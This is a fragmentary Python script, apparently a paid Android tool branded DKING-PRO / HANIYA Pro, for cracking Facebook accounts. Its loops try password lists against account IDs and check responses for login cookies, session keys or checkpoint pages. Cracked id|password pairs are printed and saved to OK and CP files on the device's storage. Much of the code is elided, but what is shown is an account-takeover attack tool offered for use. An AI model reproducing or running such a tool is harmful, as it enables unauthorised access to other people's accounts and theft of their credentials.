...
----------------------------------------------
 Author    : KING DAVID
 Github    : daking72 
 Facebook  : David Abdulrazaq 
 Tool Name :DKING-PRO
 Type type : PAID
 Version   : 1.9.9
----------------------------------------------
 HANIYA Pro version 1.9.9
 For Haters: Tumhare Okat Nhi Mujhse Milne Ki ðŸ¤ž
\033[1;37m----------------------------------------------""")
def linex():
        print('\033[1;37m----------------------------------------------')
def clear():
...
def menu():
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        linex()
                        tks = ("Hi DAVID SIR, I Need To Buy Your Paid HANIYA PRO Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Aking:
                                ...
                                print('\r\r\033[1;32m [DKING-OK] %s | %s'%(ids,pas))
                                open('/sdcard/HANIYA-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Haniya:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [DKING-CP] '+ids+' | '+pas+'\033[1;97m')
                ...
                try:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;208m [DKING-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/DKING-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                                cps.append(ids)
                                                break
                                        else:
                                                open('/sdcard/DKING-CP.txt','a').write(ids+'|'+pas+'\n')
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        try:
                                                ...
                                                print('\r\r\033[1;32m [DKING-OK] '+uid+' | '+pas+'\033[1;97m')
                                                open('/sdcard/DKING-OK.txt','a').write(uid+'|'+pas+'\n')
                                                oks.append(ids)
                                                break
                                else:
                                        continue
